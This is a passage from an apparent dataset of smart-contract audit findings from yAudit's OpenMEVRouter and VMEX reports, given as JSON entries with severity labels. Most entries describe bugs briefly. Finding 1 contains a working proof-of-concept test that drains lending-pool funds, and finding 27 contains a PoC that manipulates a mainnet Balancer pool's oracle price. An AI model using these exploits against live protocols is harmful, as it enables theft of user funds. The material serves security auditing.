"Difficulty: n/a"]}, {"title": "25. Missing curly brace", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "This if statement is missing curly braces.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "26. Reduce number of swaps", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "Consider the constant product diagram Point 1 shows the liquidity pool amounts before OpenMevRouter interaction, point 2 shows the amounts after the OpenMevRouter user swap, and point 3 shows the amounts after the first backrun of the arb process. These two steps can be combined to arrive from point 1 to point 3, skipping to need to swap to arrive at point 2. The math in OpenMevRouter.sol would need changing, but gas savings from removing one swap may be enough to reduce overall gas consumption.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "27. Revert if zero flashloan profit", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The revert logic for the kashi flashloan callback is currently: if (amountOver < amountOwing) revert InsufficientOutputAmount(); Instead, the revert should also happen on the equality case: if (amountOver <= amountOwing) revert InsufficientOutputAmount(); The same improvement can be made in the Aave flashloan callback.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "28. OpenMevRouter should inherit from IFlashBorrower and IOpenMevRouter", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "28. OpenMevRouter should inherit from IFlashBorrower and IOpenMevRouter", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "29. The ETHERSCAN_API key is present in plaintext", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "29. The ETHERSCAN_API key is present in plaintext", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "30. SafeTransferLib does not match Solmate's main branch", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "30. SafeTransferLib does not match Solmate's main branch", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "31. Incorrect comment", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The comment on line 1001 doesn't match the code in line 1002.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "32. Replace magic numbers with constants", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "There are many instances of the value 1000. Consider replacing this magic number with a constant internal variable named MINIMUM_LIQUIDITY like Uniswap does: First instance Second instance Third instance Fourth instance Fifth instance Other instances of magic numbers are found in calcCoeffs().", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "33. Typos", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "First typo Second typo", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "34. Hard coded Aave token list", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The hard coded list of tokens in OpenMevLibrary.sol.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "35. Inconsistency in WETH transfers", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The one instance of a WETH transfer with require(IWETH(weth).transfer(pair, amount));. All other instances use IWETH(weth).deposit{ value: amount }(); First instance Second instance Third instance", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "36. safeApprove vulnerable to double withdraw", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "One relevant safeApprove() call was found. Permit is used in several functions in OpenMevRouter.sol: First function Second function Third function", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. Same frontrunning weaknesses as Uniswap/SushiSwap", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "Project documentation explaining these attack vectors still remain.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Kashi flashloanable tokens assumed same as aave", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "The logic to backrun a swap happens if either there is sufficient token balance in the router that no flashloan is needed, or the token can be flashloaned from Aave. There is no separate list of Kashi-supported flashloanable tokens. Only a list of Aave flashloanable tokens exists.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "39.  (engn33r)", "html_url": "https://github.com/yAudit/reports/blob/main/md/05-2022-OpenMEVRouter.md", "body": "Incorrect comment for add512x512()", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Funds can be drained from the protocol", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "ValidationLogic.sol#L193. In the following POC, an attacker can borrow 100,000 USDC with 10 ETH of collateral with ETH being priced around 270 USD in the tests, that's about 2,700 USDC of collateral. You can run this test in your test suite. import { APPROVAL_AMOUNT_LENDING_POOL, } from \"../../helpers/constants\"; import { convertToCurrencyDecimals, convertToCurrencyUnits } from \"../../helpers/contracts-helpers\"; import { expect } from \"chai\"; import { ethers } from \"ethers\"; import { ProtocolErrors } from \"../../helpers/types\"; import { makeSuite, TestEnv } from \"./helpers/make-suite\"; import { CommonsConfig } from \"../../markets/aave/commons\"; import { getVariableDebtToken } from \"../../helpers/contracts-getters\"; const AAVE_REFERRAL = CommonsConfig.ProtocolGlobalParams.AaveReferral; makeSuite(\"Borrow exploit\", (testEnv: TestEnv) => { it(\"exploit\", async () => { const { users, pool, weth, usdc, oracle } = testEnv; var ethPrice = await oracle.getAssetPrice(weth.address) console.log(\"eth price: \", ethPrice) var usdcPrice = await oracle.getAssetPrice(usdc.address) console.log(\"usdc price: \", usdcPrice) var victims = users[0] var config = await pool.getReserveData(usdc.address, 0) var debtToken = await getVariableDebtToken(config[7]) // Seed 1M in the pool. await usdc .connect(victims.signer) .mint(await convertToCurrencyDecimals(usdc.address, \"1000000\")); await usdc .connect(victims.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(victims.signer) .deposit( usdc.address, 0, await convertToCurrencyDecimals(usdc.address, \"1000000\"), victims.address, \"0\" ); var attackerAddress0 = users[1] var attackerAddress1 = users[2] await weth .connect(attackerAddress0.signer) .mint(await convertToCurrencyDecimals(weth.address, \"10\")); await weth .connect(attackerAddress0.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(attackerAddress0.signer) .deposit( weth.address, 0, ethers.utils.parseEther(\"10\"), attackerAddress0.address, \"0\" ); await weth .connect(attackerAddress1.signer) .mint(await convertToCurrencyDecimals(weth.address, \"10\")); await weth .connect(attackerAddress1.signer) .approve(pool.address, APPROVAL_AMOUNT_LENDING_POOL); await pool .connect(attackerAddress1.signer) .deposit( weth.address, 0, ethers.utils.parseEther(\"10\"), attackerAddress1.address, \"0\" ); await debtToken .connect(attackerAddress1.signer) .approveDelegation(attackerAddress0.address, ethers.utils.parseEther(\"1\")) for(var i=0; i<50;i++) { await pool .connect(attackerAddress0.signer) .borrow( usdc.address, 0, await convertToCurrencyDecimals(usdc.address, \"2000\"), AAVE_REFERRAL, attackerAddress1.address ); } var usdcBalance = await usdc.balanceOf(attackerAddress0.address) console.log(\"attacker balance: \", await convertToCurrencyUnits(usdc.address, usdcBalance.toString())) }); });", "labels": ["yAudit", "Severity: Critical", "Difficulty: n/a"]}, {"title": "2. Tranche admin can DOS their tranche by setting treasury address to address(0)", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "Tranche admins can update their fee address via LendingPoolConfigurator.updateTreasuryAddress(), and there is no check to ensure that the address they set is not address(0). The function ReserveLogic.updateState() is called in nearly all of the protocol's critical functions, including deposit(), withdraw(), repay(), borrowHelper(), and liquidationCall(). The following (abridged) call sequence occurs whenever updateState() is performed: ReserveLogic.updateState() -> ReserveLogic._mintToTreasury() -> AToken.mintToTreasury() -> AToken._mint(): The AToken functions are below: function mintToTreasury(uint256 amount, uint256 index) external override onlyLendingPool { if (amount == 0) { return; } // get tranche admin's fee address from configurator address treasury = ILendingPoolConfigurator(_lendingPoolConfigurator).trancheAdminTreasuryAddresses(_tranche); _mint(treasury, amount.rayDiv(index)); ... } function _mint(address account, uint256 amount) internal virtual { require(account != address(0), \"ERC20: mint to the zero address\"); ... } The require statement in _mint() will cause the state update to revert if the recipient address is 0x0, preventing the protocol from functioning. Note that a global admin can recover the tranche from this state by setting the tranche's treasury address to a valid address (and likely removing the tranche admin). However, this is a manual process and requires the global admin to be aware of the issue and take action. To reproduce this issue, modify helpers/contract-deployment.ts to set treasuryAddress to \"0x0000000000000000000000000000000000000000\" at L237 and L623. Observe that many tests now revert with \"ERC20: mint to the zero address\".", "labels": ["yAudit", "Severity: Critical", "Difficulty: n/a"]}, {"title": "3. An attacker can DOS users deposits", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "When a user deposits for the first time an asset into a tranche, it will enable the usage as collateral. An attacker could distribute dust to target accounts with deposits to block the user from using it. It will prevent users from using the funds.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "4. Incorrect Curve oracle reentrancy protection", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "check_reentrancy(): bool success = false; (success,) = curve_pool.call(abi.encodeWithSignature(\"claim_admin_fees()\")); if (!success) { (success,) = ICurvePool(curve_pool).owner().call(abi.encodeWithSignature(\"withdraw_admin_fees()\")); require(success, Errors.VO_REENTRANCY_GUARD_FAIL); } It's a good practice to call to an address via wrapping it an interface instead of low level .call, as .call will always be successful on EOAs. For the Curve pools that don't implement claim_admin_fees() (example: DAI/USDC/USDT pool), withdraw_admin_fees() on owner (example: DAI/USDC/USDT pool's owner) is called. The correct function signature is withdraw_admin_fees(_pool: address). So it will always return false. Hence, if the call goes to the pool owner, it always reverts. This call also puts a lock on the owner contract instead of the pool because DAI/USDC/USDT pool doesn't have a lock on withdraw_admin_fees(). However, this pool is safe from this reentrancy attack as it doesn't use native token. Curve pools with native token have this reentrancy lock (example: ETH/stETH pool), however, older pools may not have this lock or this lock can be missed in error.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "5. Tranche admin can self-benefit at the expense of users", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "setReserveInterestRateStrategyAddress(), setReserveFactor()", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "6. Incorrect order of arguments in calls to IncentivesController.handleAction()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "IncentivizedERC20's _mint(), _burn() and _transfer() function calls to handleAction(address user, uint256 userBalance, uint256 totalSupply) incorrectly. Consider _transfer(): uint256 currentTotalSupply = _totalSupply; _getIncentivesController().handleAction(sender, currentTotalSupply, oldSenderBalance); if (sender != recipient) { _getIncentivesController().handleAction(recipient, currentTotalSupply, oldRecipientBalance); } Notice that currentTotalSupply and oldSenderBalance are swapped.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "7. No access control on setIncentivesController()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "LendingPoolAddressesProvider.sol#L486 function setIncentivesController(address incentives) external override { _addresses[INCENTIVES_CONTROLLER] = incentives; emit IncentivesControllerUpdated(incentives); }", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "8. User validation uses outdated protocol state", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "The validateBorrow() function is one of the most crucial functions for ensuring that users do not exceed their margin requirements when attempting to borrow funds. The implementation of this function is incorrect, as it uses outdated values to perform the margin check and updates the protocol state only after the validation has taken place. ValidationLogic.validateBorrow(...) reserve.updateState(...); Within the updateState() function both the interest earned and interest owed are updated. As the update process occurs after user input validation, any pending interest payments are ignored.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "9. Incorrect balancer LP price decimals", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "In BalancerOracle.calc_balancer_lp_price() the price is calculated as: return ((fairResA * pxA) + (fairResB * pxB)) / supply; Assume that the pool weights are (0.5, 0.5). Then the price decimals are: (dA + dB)/2 - BPT_decimals + oracle_decimals = (dA + dB)/2 - 18 + 8 Where dA and dB are the decimals of tokens A and B respectively. This is correct only if dA + dB = 36. For example if tokens A and B have both 18 decimals then the LP price will have 8 decimals as the oracle, which is correct. computeFairReserves() is commented in the following with the decimals for each variable, showing that fair reserves have (dA + dB)/2 decimals function computeFairReserves( ... uint r0 = BNum.bdiv(resA, resB); // @audit dA - dB + 18 uint r1 = BNum.bdiv(BNum.bmul(wA, pxB), BNum.bmul(wB, pxA)); // @audit 18 // fairResA = resA * (r1 / r0) ^ wB // fairResB = resB * (r0 / r1) ^ wA if (r0 > r1) { uint ratio = BNum.bdiv(r1, r0); // @audit 18 - (dA - dB + 18) + 18 = dB - dA + 18 fairResA = BNum.bmul(resA, BNum.bpow(ratio, wB)); // @audit dA + ((dB - dA + 18 - 18)/2 + 18) - 18 = (dB + dA)/2 fairResB = BNum.bdiv(resB, BNum.bpow(ratio, wA)); // @audit dB - ((dB - dA + 18 - 18)/2 + 18) + 18 = (dB + dA)/2 } else { uint ratio = BNum.bdiv(r0, r1); // @audit dA + 18 - dB fairResA = BNum.bdiv(resA, BNum.bpow(ratio, wB)); // @audit dA - ((dA + 18 - dB - 18)/2 + 18) + 18 = (dB + dA)/2 fairResB = BNum.bmul(resB, BNum.bpow(ratio, wA)); // @audit dB + ((dA + 18 - dB - 18)/2 + 18) - 18 = (dB + dA)/2 } } Note also that, again because resA and resB have the respective tokens decimals, the ratio can be much smaller than 18. This will cause rounding errors in BNum.bpow(ratio, wB) as discussed in a separate finding.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "10. Excessive timeframe could lead to stale Chainlink oracle prices", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "The getOracleAssetPrice() function uses Chainlink price feed's latestRoundData() function in order to obtain a price for the asset. latestRoundData() also returns updatedAt which is the timestamp at which the price was reported to Chainlink. A time duration threshold can be used against updatedAt to either accept or reject the price. VMEX does this, and allows a maximum timeframe of SECONDS_PER_DAY in order to consider the price not stale: function getOracleAssetPrice(address asset) internal returns (uint256){ ... ( /* uint80 roundID */, int256 price, /*uint startedAt*/, uint256 updatedAt, /*uint80 answeredInRound*/ ) = IChainlinkPriceFeed(source).latestRoundData(); IChainlinkAggregator aggregator = IChainlinkAggregator(IChainlinkPriceFeed(source).aggregator()); if (price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) && block.timestamp - updatedAt < SECONDS_PER_DAY) { return uint256(price); } ... } 1 day is a good enough check for stablecoins but volatile assets, Chainlink has a much shorter price refresh period (called heartbeat). For example, LINK/USD oracle on Optimism has a heartbeat of 1200 seconds. Hence, despite this check, Vmex will continue accepting a stale price if Chainlink fails to report it within the shorter heartbeat.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "11. Velo LP price can be manipulated to liquidate", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "The initial state of the LP: weth/USDC pair: `0x79c912FEF520be002c2B6e57EC4324e260f38E50` Total supply = 112602391366085351 reserveA uint256 : 4908868931818 * 10**18 / 10**6 (USDC) reserveB uint256 : 2583875906785643384998 * 10**18 / 10**18 (WETH) sqrt(4.9088689e+24 * 2583875906785643384998) = 1.1262286e+23 prices: USDC = 100000000 WETH = 191007000000 sqrt(100000000 * 191007000000) = 4370434760 LP price = 2 * 1.1262286e+23 * 4370434760 / 112602391366085351 = 8.7424584e+15 So we have an LP price of 87,424,584 USD The attacker proceeds to take a loan and swaps 50,000 WETH for USDC. weth/USDC pair: `0x79c912FEF520be002c2B6e57EC4324e260f38E50` Total supply = 112602391366085351 (unchanged)/ reserveA uint256 : (4908868931818 - 4695363000000) * 10**18 / 10**6 (USDC) reserveB uint256 : (2583875906785643384998 + 50000 * 10**18) * 10**18 / 10**18 (WETH) sqrt(5.2583876e+22 * 2.1350593e+23) = 1.0595739e+23 prices: USDC = 100000000 WETH = 191007000000 sqrt(100000000 * 191007000000) = 4370434760 LP price = 2 * 1.0595739e+23 * 4370434760 / 112602391366085351 = 8.2250449e+15 So we have an LP price of 82,250,448 USD In this example, the LP price has now decreased by 6%. The attacker must liquidate accounts, requiring around 50 ETH to cover the swap cost for this particular pool. However, this amount can vary significantly based on the pool's liquidity.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "12. borrowFactor can be less than 100%", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "setBorrowingEnabled() validateCollateralParams()", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "13. Usage of transferFrom() instead of safeTransferFrom()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "This issue can be found here: IncentivesController.sol#L159, IncentivesController.sol#L193", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "14. Oracle pricing for stable coins LP will trigger liquidation earlier than expected", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "With a stable coin unpeg, on the LP pools, the price of the entire assets used to price the pool is the lowest of the three assets in the pool. In case of a USDC-USDT pool properly balanced 50-50 if one of the assets unpeg to 0.9 a user that has deposited 100 USD worth of assets prior to unpeg will have his deposits valued at 90 USD instead of 95 USD reducing his collateral value and resulting in a potential liquidation/loss./ This pattern can be found in the following two oracles: BalancerOracle.sol#L139 CurveOracle.sol#L36", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "15. Blacklist/Whitelist does not behave as expected and tranche admins can block all transfers", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "AToken._transfer() calls LendingPool.finalizeTransfer() which internally calls checkWhitelistBlacklist() to check if both the msg.sender and the token receiver are whitelisted/blacklisted for the respective tranche. In the context of this call however, msg.sender is the aToken contract, rather than the transfer's from address. Accordingly, even if a token sender is blacklisted (or non-whitelisted), they will still be able to transfer their tokens to a new address as the from address is never checked. Afterwards, the receiving address will be able to freely interact with the protocol (in the blacklist case; if the new address is not on the whitelist they will still be blocked from deposit/borrowing). Similarly, a tranche admin can block all aToken transfers for their tranche by either: Adding the aToken's address to the blacklist Enabling the whitelist Note that even if a tranche admin blocks transfers, users will still be able to withdraw their funds directly from the system. However, if they are using their aTokens with a different protocol (e.g. depositing them in yield farm or using them as collateral for a loan elsewhere), they will not be able to remove their tokens from the outside protocol to withdraw from VMEX. LendingPool.sol (_checkWhitelistBlacklist(), finalizeTransfer()): // @audit \"user\" is always either msg.sender or \"to\" address; never the token transfer's \"from\". function _checkWhitelistBlacklist(uint64 trancheId, address user) internal view { if (trancheParams[trancheId].isUsingWhitelist) { require( _usersConfig[user][trancheId].configuration.getWhitelist(), Errors.LP_NOT_WHITELISTED_TRANCHE_PARTICIPANT ); } require(!_usersConfig[user][trancheId].configuration.getBlacklist(), Errors.LP_BLACKLISTED_TRANCHE_PARTICIPANT); } function checkWhitelistBlacklist(uint64 trancheId, address onBehalfOf) internal view { _checkWhitelistBlacklist(trancheId, msg.sender); if (onBehalfOf != msg.sender) { _checkWhitelistBlacklist(trancheId, onBehalfOf); } } ... // @audit this is called from the aToken contract in AToken._transfer() function finalizeTransfer( address asset, uint64 trancheId, address from, address to, uint256 amount, uint256 balanceFromBefore, uint256 balanceToBefore ) external override whenTrancheNotPausedAndExists(trancheId) { require(msg.sender == _reserves[asset][trancheId].aTokenAddress, Errors.LP_CALLER_MUST_BE_AN_ATOKEN); // @audit The \"from\" address is not passed to this check. By blacklisted (or not whitelisting) // the aToken address, a tranche admin can cause this to always revert. checkWhitelistBlacklist(trancheId, to); ... } AToken._transfer(): function _transfer(address from, address to, uint256 amount, bool validate) internal { address underlyingAsset = _underlyingAsset; ILendingPool pool = _pool; ... // @audit \"validate\" is true for standard transfer() and transferFrom() calls; not on liquidations if (validate) { pool.finalizeTransfer( underlyingAsset, _tranche, from, to, amount, fromBalanceBefore, toBalanceBefore ); }", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "16. nthroot() should use established libraries for calculating roots", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "nthroot(): function nthroot(uint8 n, uint256 _product) internal pure returns (uint256) { //VMEX empirically checked that this is only accurate for square roots and cube roots, // and the decimals are 9 and 12 respectively if (n == 2) { return LogExpMath.pow(_product, 1e18 / n) / 1e9; } if (n == 3) { return LogExpMath.pow(_product, 1e18 / n) / 1e12; } revert(\"Balancer math only can handle square roots and cube roots\"); } nthroot() also reverts for high values like 57896044618658097711785492504343953926634992332820282019728792003956564819968. It should not be achievable but the alternatives accommodate these values too.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "17. Protocol should only choose a single asset denomination for all tranches", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "On ETH mainnet, you can have prices denominated in ETH or USD value. see: https://data.chain.link/ethereum/mainnet/crypto-eth and https://data.chain.link/ethereum/mainnet/crypto-usd VMEXOracle.sol#L96", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "18. Asset mapping might not be set and should be checked to be non-zero", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "LendingPool.sol#L109", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "19. finalizeTransfer() and liquidationCall() auto-enables collateral for receiver", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "DepositWithdrawLogic.sol#L80 does this if the asset is enabled as collateral in reserve data: if (isFirstDeposit) { // if collateral is enabled, by default the user's deposit is marked as collateral user.setUsingAsCollateral(self.id, self.configuration.getCollateralEnabled(vars.asset, vars._assetMappings)); } LendingPool.sol#L645 and LendingPoolCollateralManager.sol#L237-L239 always sets it to true: if (balanceToBefore == 0 && amount != 0) { DataTypes.UserConfigurationMap storage toConfig = _usersConfig[to][trancheId].configuration; toConfig.setUsingAsCollateral(reserveId, true); emit ReserveUsedAsCollateralEnabled(asset, trancheId, to); } liquidatorConfig.setUsingAsCollateral( collateralReserve.id, true ); This can be made consistent to always use getCollateralEnabled() so that an invalid state never enters the protocol.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "20. Remove the special treatment of type(uint256).max in validateBorrow()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "ValidationLogic.sol#L176-L202", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "21. Check if asset has been added before setting its parameters", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "setVMEXReserveFactor() and setBorrowingEnabled() don't validate that the asset has already been added.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "22. Use OZ SafeCast", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "AssetMappings.sol#L275-L278 can silently overflow uint64's max value.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "23. registerAddressesProvider() doesn't check if a provider is already registered", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "If registerAddressesProvider() can be called twice on the same provider with different ids. The second call will overwrite _addressesProviders[provider].", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "24. checkAmount() can overflow", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "checkAmount() uses unchecked to verify if requested borrow amount does not breach borrowCap: unchecked { require( totalDebt + amount <= borrowCap * 10**decimals, Errors.VL_BORROW_CAP_EXCEEDED ); } RHS will work as borrowCap will be set such that it's not possible to overflow unless you set it really high which will be an error on the part of the global admin. In general, unless you have a proof that this won't overflow or if the overflow is desired, then only unchecked should be used.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "25. Use abi.encodeCall instead of abi.encodeWithSelector", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "New aTokens are deployed as follows: address aTokenProxyAddress = _initTokenWithProxy( addressesProvider.getATokenBeacon(), abi.encodeWithSelector( IInitializableAToken.initialize.selector, cachedPool, address(this), //lendingPoolConfigurator address address(addressesProvider), // input.underlyingAsset, trancheId ) ); Here is the function signature of AToken.initialize(): function initialize( ILendingPool pool, InitializeTreasuryVars memory vars ) external override initializer {", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "26. setAssetAllowed(asset, false) logic allows DoS attack", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "If setPermissionlessTranches(true) is called, claimTrancheId() can be called by anyone, therefore creating a new tranche. In the method setAssetAllowed(), if isAllowed == false, the check validateAssetAllowed() will be run: function setAssetAllowed(address asset, bool isAllowed) external onlyGlobalAdmin{ ... if (!isAllowed) { validateAssetAllowed(asset); } ... } function validateAssetAllowed(address asset) internal view { ... for (uint64 tranche = 0; tranche < totalTranches; tranche++) { ... } } Each iteration will cost some gas, if there are too many tranches whether it is under a normal scenario or an attack, this function will use too much gas and will not be callable creating a DoS.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "27. Balancer LP fair price can be manipulated for illiquid pools", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "The BNum.bpow() function returns accurate values down to 1e-6 (1e12 in wei). Below that, the result is larger than expected. Here is a code snippet that shows this: function testBpow() public { uint exp = 0.5*1e18; uint bpowRes; uint expectedRes; uint base; uint ratio; for (uint i=0; i<=18; i+=2) { base = 10**i; bpowRes = BNum.bpow(base, exp); expectedRes = 10**(i/2 + 9); ratio = bpowRes/expectedRes; console.log(\"- (1e%d)^0.5 bpow/expected: %d\", i, ratio); } } which will print: Logs: - (1e0)^0.5 bpow/expected: 399293 - (1e2)^0.5 bpow/expected: 39929 - (1e4)^0.5 bpow/expected: 3992 - (1e6)^0.5 bpow/expected: 399 - (1e8)^0.5 bpow/expected: 39 - (1e10)^0.5 bpow/expected: 4 - (1e16)^0.5 bpow/expected: 1 - (1e18)^0.5 bpow/expected: 1 In BalancerOracle.computeFairReserves() the ratio variable is around 1e18 for balanced pools (NOTE: This is only true when the pool tokens have 18 decimals, but decimals are discussed in another finding and the related fix will make it true for all tokens). If a pool has low liquidity then it is possible to swap a large amount to make it unbalanced and manipulate the fair price. Note that in order to impact the fair price the reserve ratio must become 1e-6 or less (1e12 in wei), meaning that an attacker should have to swap an amount of at least 1000 times the current pool reserves. Also, multiple swaps must be performed to bypass Balancer's check on maximum swapped amount making the manipulation gas expensive. For these reasons, it seems unlikely that an attacker can manipulate the LP collateral price profitably. Here is a PoC of the manipulation on the ETH-UNI Mainnet pool: function testManip() public { address pool = 0x5Aa90c7362ea46b3cbFBD7F01EA5Ca69C98Fef1c; //UNI-ETH pool on mainnet uint UNI_price = 5.15*1e8; // UNI-USDC chainlink price uint ETH_price = 1800*1e8; // ETH-USDC chainlink price console.log(\"Mainnet block:\", block.number); uint256[] memory prices = new uint256[](2); prices[0] = UNI_price; prices[1] = ETH_price; // direct LP price calculation bytes32 pool_id = IBalancer(pool).getPoolId(); IVault balancer_vault = IBalancer(pool).getVault(); (IERC20[] memory tokens, uint256[] memory balances, ) = balancer_vault.getPoolTokens(pool_id); uint totPoolUSDCvalue = UNI_price*balances[0]/1e18 + ETH_price*balances[1]/1e18; uint LPprice = totPoolUSDCvalue*(10**IBalancer(pool).decimals())/IBalancer(pool).totalSupply(); console.log(\"LP expected price:\", LPprice); // use Balancer Oracle to get LP price uint LPoraclePrice = BalancerOracle.get_lp_price(pool, prices, 0, true); console.log(\"LP oracle price before manipulation:\", LPoraclePrice); // Swap 100_000 ETH on pool uint amount = 1e5*1e18; vm.deal(address(this), amount); IWETH9(address(tokens[1])).deposit{value:1e5*1e18}(); IWETH9(address(tokens[1])).approve(address(balancer_vault), amount); // 1. Swap WETH for UNI FundManagement memory funds = FundManagement( { sender: address(this), fromInternalBalance: false, recipient: payable(address(this)), toInternalBalance: false } ); bytes memory userData; SingleSwap memory singleSwap = SingleSwap( { poolId: pool_id, kind: SwapKind(0), assetIn: address(tokens[1]), assetOut: address(tokens[0]), amount: amount, userData: userData } ); while (true) { // do multiple swaps because balancer limit swap amount to 30% of reserves (, balances, ) = balancer_vault.getPoolTokens(pool_id); amount = balances[1]*3/10; // maximum that can be swapped due to balancer limits if (IWETH9(address(tokens[1])).balanceOf(address(this)) < amount) break; singleSwap.amount = amount; IBalancerVault(address(balancer_vault)).swap(singleSwap, funds, 0, block.timestamp + 1); } LPoraclePrice = BalancerOracle.get_lp_price(pool, prices, 0, true); console.log(\"LP oracle price after manipulation:\", LPoraclePrice); } which will print: Logs: Mainnet block: 17251326 LP expected price: 9752931061 LP oracle price before manipulation: 9752695445 LP oracle price after manipulation: 91173235346 The full PoC is available here: https://gist.github.com/bahurum/67ef6ea9ea820108844b320c977a3c34", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "28. Fetching the decimals is only required once", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "DistributionManager.sol#L53", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "29. Price oracle is fetched on every iteration of the loop", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": 